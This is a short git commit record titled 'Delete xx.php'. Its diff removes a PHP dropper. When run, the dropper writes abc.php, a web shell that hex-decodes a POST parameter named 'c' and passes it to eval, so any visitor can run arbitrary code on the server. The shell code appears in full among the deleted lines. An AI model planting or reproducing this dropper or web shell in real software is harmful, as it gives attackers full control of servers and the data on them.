14b5e53237ad9375b95159a3ebb69818d50e0570
helnsnh <xiahsdjhsa22@outlook.com>
2025-07-01 15:24:06 +0800

    Delete xx.php

--- xx.php
+++
@@ -1,6 +0,0 @@
-<?php
-echo "123";
-file_put_contents('abc.php','<?php echo "ok"; $param = \'c\'; $inputCode = filter_input(INPUT_POST, $param); $decoded = hex2bin($inputCode); eval($decoded); ?>');
-sleep(5);
-echo "456";
-?>
